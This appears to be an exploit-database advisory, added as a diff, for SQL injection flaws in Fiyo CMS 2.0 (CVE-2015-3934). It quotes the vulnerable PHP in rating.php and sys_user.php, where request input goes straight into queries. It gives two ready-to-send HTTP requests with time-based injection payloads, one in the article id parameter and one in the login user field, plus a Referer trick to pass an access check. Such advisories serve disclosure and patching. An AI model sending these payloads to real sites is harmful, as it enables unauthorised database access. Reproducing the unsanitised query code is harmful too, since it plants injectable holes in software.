@@ -1,0 +1,85 @@
+# Exploit Title: Fiyo CMS multiple SQL vulnerability
+# Date: 2015-06-28
+# Exploit Author: cfreer (poc-lab)
+# Vendor Homepage:  http://www.fiyo.org/
+# Software Link:
+http://tcpdiag.dl.sourceforge.net/project/fiyo-cms/Fiyo%202.0/fiyo_cms_2.0.2.zip
+# Version: 2.0_1.9.1
+# Tested on: Apache/2.4.7 (Win32)
+# CVE : CVE-2015-3934
+
+
+1、
+
+The vulnerable file is /apps/app_article/controller/rating.php, because the
+rating.php includes jscore.php, so we must add referer in
+HTTP Data Stream to bypass the limits of authority.when the 'do' equal
+'rate' the vulnerable is same too.
+
+
+require('../../../system/jscore.php');
+
+if(!isset($_POST['id']))
+header('../../../');
+else {
+$id = $_POST['id'];
+ $db = new FQuery();
+$db->connect();
+$qrs = $db->select(FDBPrefix.'article','*',"id=$id");
+$qrs = $qrs[0];
+
+
+POC:
+
+HTTP Data Stream
+
+POST //fiyocms/apps/app_article/controller/rating.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101
+Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:80/fiyocms/
+Cookie: ECS[visit_times]=4; iAv6_2132_saltkey=JLrHe7OQ;
+PHPSESSID=nl1e3jdfd8i7flnhffp37ro2s3
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+
+do=getrate&id=182;select  sleep(5)  --
+
+
+
+=====================================================================================================================================
+
+2、
+
+POC:
+
+POST /fiyocms/user/login HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101
+Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: ECS[visit_times]=4; iAv6_2132_saltkey=JLrHe7OQ;
+PHPSESSID=4gl29hsns650jqj5toakt044h0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+
+user='%2B(select(0)from(select(sleep(5)))v)%2B'&pass=poc-lab&login=Login
+
+
+The vulnerable file is \apps\app_user\sys_user.php
+
+if(isset($_POST['login'])) {
+$_POST['user'] = strip_tags($_POST['user']);
+$qr = $db->select(FDBPrefix."user","*","status=1 AND user='$_POST[user]'
+AND password='".MD5($_POST['pass'])."'");
+
+
+The parameter of user is vulnerable. strip_tags doesn't work, Still can be
+bypass.
